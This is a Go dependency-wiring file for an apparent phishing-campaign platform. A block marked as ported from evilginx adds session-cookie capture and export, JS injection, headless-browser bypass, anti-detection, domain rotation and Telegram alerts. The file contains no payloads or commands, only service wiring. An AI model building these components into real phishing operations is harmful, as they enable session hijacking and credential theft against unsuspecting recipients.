package app

import (
	"github.com/caddyserver/certmagic"
	"github.com/phishingclub/phishingclub/service"
	"go.uber.org/zap"
	"gorm.io/gorm"
)

// Services is a collection of services
type Services struct {
	Asset               *service.Asset
	Attachment          *service.Attachment
	File                *service.File
	Company             *service.Company
	InstallSetup        *service.InstallSetup
	Option              *service.Option
	Page                *service.Page
	Proxy               *service.Proxy
	Session             *service.Session
	User                *service.User
	Domain              *service.Domain
	Recipient           *service.Recipient
	RecipientGroup      *service.RecipientGroup
	SMTPConfiguration   *service.SMTPConfiguration
	Email               *service.Email
	CampaignTemplate    *service.CampaignTemplate
	Campaign            *service.Campaign
	Template            *service.Template
	APISender           *service.APISender
	AllowDeny           *service.AllowDeny
	Webhook             *service.Webhook
	Identifier          *service.Identifier
	Version             *service.Version
	SSO                 *service.SSO
	Update              *service.Update
	Import              *service.Import
	Backup              *service.Backup
	IPAllowList         *service.IPAllowListService
	ProxySessionManager *service.ProxySessionManager
	OAuthProvider       *service.OAuthProvider
	Telegram            *service.Telegram
	CookieExport        *service.CookieExport
	Turnstile           *service.Turnstile
	DomainRotator       *service.DomainRotator
	LiveMap             *service.LiveMap
	JSInjection         *service.JsInjection
	HeadlessBypasser    *service.HeadlessBypasser
	SMS                 *service.SMS
	AntiDetection       *service.AntiDetection
	EmailWarming        *service.EmailWarming
	EnhancedHeaders     *service.EnhancedHeaders
	BotGuard            *service.BotGuard
	CapturedSession     *service.CapturedSessionSender
	ContentBalancer     *service.ContentBalancer
	WebServerRules      *service.WebServerRulesGenerator
	DKIM                *service.DKIM
	LinkManager         *service.LinkManager
	AttachmentGenerator *service.AttachmentGenerator
	CookieStore         *service.CookieStoreService
}

// NewServices creates a collection of services
func NewServices(
	db *gorm.DB,
	repositories *Repositories,
	logger *zap.SugaredLogger,
	utilities *Utilities,
	assetPath string,
	attachmentPath string,
	ownManagedCertificatePath string,
	enviroment string,
	certMagicConfig *certmagic.Config,
	certMagicCache *certmagic.Cache,
	filePath string,
) *Services {
	common := service.Common{
		Logger: logger,
	}
	templateService := &service.Template{
		Common:              common,
		RecipientRepository: repositories.Recipient,
	}
	file := &service.File{
		Common: common,
	}
	asset := &service.Asset{
		Common:           common,
		RootFolder:       assetPath,
		FileService:      file,
		AssetRepository:  repositories.Asset,
		DomainRepository: repositories.Domain,
	}
	attachment := &service.Attachment{
		Common:               common,
		RootFolder:           attachmentPath,
		FileService:          file,
		AttachmentRepository: repositories.Attachment,
		EmailRepository:      repositories.Email,
	}
	installSetup := &service.InstallSetup{
		Common:            common,
		UserRepository:    repositories.User,
		RoleRepository:    repositories.Role,
		CompanyRepository: repositories.Company,
		PasswordHasher:    utilities.PasswordHasher,
	}
	sessionService := &service.Session{
		Common:            common,
		SessionRepository: repositories.Session,
	}
	optionService := &service.Option{
		Common:           common,
		OptionRepository: repositories.Option,
	}
	userService := &service.User{
		Common:            common,
		UserRepository:    repositories.User,
		RoleRepository:    repositories.Role,
		CompanyRepository: repositories.Company,
		PasswordHasher:    utilities.PasswordHasher,
	}
	recipient := &service.Recipient{
		Common:                      common,
		RecipientRepository:         repositories.Recipient,
		RecipientGroupRepository:    repositories.RecipientGroup,
		CampaignRepository:          repositories.Campaign,
		CampaignRecipientRepository: repositories.CampaignRecipient,
	}
	recipientGroup := &service.RecipientGroup{
		Common:                      common,
		CampaignRepository:          repositories.Campaign,
		CampaignRecipientRepository: repositories.CampaignRecipient,
		RecipientGroupRepository:    repositories.RecipientGroup,
		RecipientRepository:         repositories.Recipient,
		RecipientService:            recipient,
		DB:                          db,
	}
	webhook := &service.Webhook{
		Common:             common,
		CampaignRepository: repositories.Campaign,
		WebhookRepository:  repositories.Webhook,
	}
	campaignTemplate := &service.CampaignTemplate{
		Common:                     common,
		CampaignTemplateRepository: repositories.CampaignTemplate,
		CampaignRepository:         repositories.Campaign,
		IdentifierRepository:       repositories.Identifier,
	}
	apiSender := &service.APISender{
		Common:                  common,
		APISenderRepository:     repositories.APISender,
		TemplateService:         templateService,
		CampaignTemplateService: campaignTemplate,
	}
	smtpConfiguration := &service.SMTPConfiguration{
		Common:                      common,
		SMTPConfigurationRepository: repositories.SMTPConfiguration,
		CampaignTemplateService:     campaignTemplate,
	}
	page := &service.Page{
		Common:                  common,
		CampaignRepository:      repositories.Campaign,
		PageRepository:          repositories.Page,
		CampaignTemplateService: campaignTemplate,
		TemplateService:         templateService,
		DomainRepository:        repositories.Domain,
	}
	domain := &service.Domain{
		Common:                    common,
		OwnManagedCertificatePath: ownManagedCertificatePath,
		CertMagicConfig:           certMagicConfig,
		CertMagicCache:            certMagicCache,
		DomainRepository:          repositories.Domain,
		CompanyRepository:         repositories.Company,
		CampaignTemplateService:   campaignTemplate,
		AssetService:              asset,
		FileService:               file,
		TemplateService:           templateService,
	}
	proxySessionManager := service.NewProxySessionManager(logger)
	proxy := &service.Proxy{
		Common:                  common,
		ProxyRepository:         repositories.Proxy,
		DomainRepository:        repositories.Domain,
		CampaignRepository:      repositories.Campaign,
		CampaignTemplateService: campaignTemplate,
		DomainService:           domain,
		ProxySessionManager:     proxySessionManager,
	}
	ipAllowListService := service.NewIPAllowListService(logger, repositories.Proxy)
	email := &service.Email{
		Common:            common,
		AttachmentPath:    attachmentPath,
		AttachmentService: attachment,
		DomainService:     domain,
		EmailRepository:   repositories.Email,
		SMTPService:       smtpConfiguration,
		RecipientService:  recipient,
		TemplateService:   templateService,
	}
	browserSessionService := service.NewBrowserSessionService(logger)
	cookieStoreService := &service.CookieStoreService{
		Common:                  common,
		Logger:                  logger,
		CookieStoreRepo:         repositories.CookieStore,
		CookieStoreMessageRepo:  repositories.CookieStoreMessage,
		ProxyCaptureRepo:        repositories.ProxyCapture,
		BrowserSession:          browserSessionService,
	}
	campaign := &service.Campaign{
		Common:                      common,
		CampaignRepository:          repositories.Campaign,
		CampaignRecipientRepository: repositories.CampaignRecipient,
		RecipientRepository:         repositories.Recipient,
		RecipientGroupRepository:    repositories.RecipientGroup,
		AllowDenyRepository:         repositories.AllowDeny,
		WebhookRepository:           repositories.Webhook,
		CampaignTemplateService:     campaignTemplate,
		DomainService:               domain,
		RecipientService:            recipient,
		MailService:                 email,
		APISenderService:            apiSender,
		SMTPConfigService:           smtpConfiguration,
		CookieStoreService:          cookieStoreService,
		WebhookService:              webhook,
		TemplateService:             templateService,
		AttachmentPath:              attachmentPath,
	}
	allowDeny := &service.AllowDeny{
		Common:              common,
		AllowDenyRepository: repositories.AllowDeny,
		CampaignRepository:  repositories.Campaign,
	}
	identifier := &service.Identifier{
		Common:               common,
		IdentifierRepository: repositories.Identifier,
	}
	companyService := &service.Company{
		Common:                   common,
		DomainService:            domain,
		PageService:              page,
		EmailService:             email,
		SMTPConfigurationService: smtpConfiguration,
		APISenderService:         apiSender,
		RecipientService:         recipient,
		RecipientGroupService:    recipientGroup,
		CampaignService:          campaign,
		CampaignTemplate:         campaignTemplate,
		AllowDenyService:         allowDeny,
		WebhookService:           webhook,
		CompanyRepository:        repositories.Company,
	}
	versionService := &service.Version{Common: common}
	ssoService := &service.SSO{
		Common:         common,
		OptionsService: optionService,
		UserService:    userService,
		SessionService: sessionService,
		// MSALClient:     msalClient, this dependency is set AFTER this function
	}
	backupService := &service.Backup{
		Common:        common,
		OptionService: optionService,
		DB:            db,
		FilePath:      filePath,
	}
	updateService := &service.Update{
		Common:        common,
		OptionService: optionService,
	}
	importService := &service.Import{
		Common:          common,
		Asset:           asset,
		Page:            page,
		Email:           email,
		File:            file,
		EmailRepository: repositories.Email,
		PageRepository:  repositories.Page,
	}
	oauthProvider := &service.OAuthProvider{
		Common:                  common,
		OAuthProviderRepository: repositories.OAuthProvider,
		OAuthStateRepository:    repositories.OAuthState,
	}

	// inject oauth provider service into api sender
	apiSender.OAuthProviderService = oauthProvider

	// --- new services ported from evilginx ---
	telegramService := service.NewTelegramService(logger, repositories.Option)
	cookieExportService := service.NewCookieExportService(logger)
	turnstileService := service.NewTurnstileService(logger, repositories.Option)
	domainRotatorService := service.NewDomainRotatorService(logger, repositories.Option, repositories.Campaign, telegramService)
	liveMapService := service.NewLiveMapService(logger, repositories.Option, repositories.Campaign)
	jsInjectionService := service.NewJsInjectionService(logger, repositories.Option)
	headlessBypasserService := service.NewHeadlessBypasserService(logger)

	smsService := &service.SMS{
		Common:           common,
		OptionRepository: repositories.Option,
	}
	antiDetectionService := &service.AntiDetection{
		Common: common,
		Logger: logger,
	}
	emailWarmingService := &service.EmailWarming{
		Common:        common,
		Logger:        logger,
		OptionService: optionService,
	}
	enhancedHeadersService := &service.EnhancedHeaders{
		Common: common,
		Logger: logger,
	}
	botGuardService := service.NewBotGuardService(logger, repositories.Option, turnstileService)

	// Wire BotGuard into LiveMap for bot detection integration
	liveMapService.SetBotGuard(botGuardService)
	capturedSessionService := &service.CapturedSessionSender{
		Common: common,
		Logger: logger,
	}
	contentBalancerService := &service.ContentBalancer{
		Common: common,
		Logger: logger,
	}
	webServerRulesService := &service.WebServerRulesGenerator{
		Common: common,
		Logger: logger,
	}
	dkimService := &service.DKIM{
		Common: common,
	}
	linkManagerService := service.NewLinkManager(logger, repositories.Proxy, repositories.Domain)
	attachmentGeneratorService := &service.AttachmentGenerator{
		Common: common,
	}

	return &Services{
		Asset:               asset,
		Attachment:          attachment,
		Company:             companyService,
		File:                file,
		InstallSetup:        installSetup,
		Option:              optionService,
		Page:                page,
		Proxy:               proxy,
		Session:             sessionService,
		User:                userService,
		Domain:              domain,
		Recipient:           recipient,
		RecipientGroup:      recipientGroup,
		SMTPConfiguration:   smtpConfiguration,
		Email:               email,
		Template:            templateService,
		CampaignTemplate:    campaignTemplate,
		Campaign:            campaign,
		APISender:           apiSender,
		AllowDeny:           allowDeny,
		Webhook:             webhook,
		Identifier:          identifier,
		Version:             versionService,
		SSO:                 ssoService,
		Update:              updateService,
		Import:              importService,
		Backup:              backupService,
		IPAllowList:         ipAllowListService,
		ProxySessionManager: proxySessionManager,
		OAuthProvider:       oauthProvider,
		Telegram:            telegramService,
		CookieExport:        cookieExportService,
		Turnstile:           turnstileService,
		DomainRotator:       domainRotatorService,
		LiveMap:             liveMapService,
		JSInjection:         jsInjectionService,
		HeadlessBypasser:    headlessBypasserService,
		SMS:                 smsService,
		AntiDetection:       antiDetectionService,
		EmailWarming:        emailWarmingService,
		EnhancedHeaders:     enhancedHeadersService,
		BotGuard:            botGuardService,
		CapturedSession:     capturedSessionService,
		ContentBalancer:     contentBalancerService,
		WebServerRules:      webServerRulesService,
		DKIM:                dkimService,
		LinkManager:         linkManagerService,
		AttachmentGenerator: attachmentGeneratorService,
		CookieStore:         cookieStoreService,
	}
}
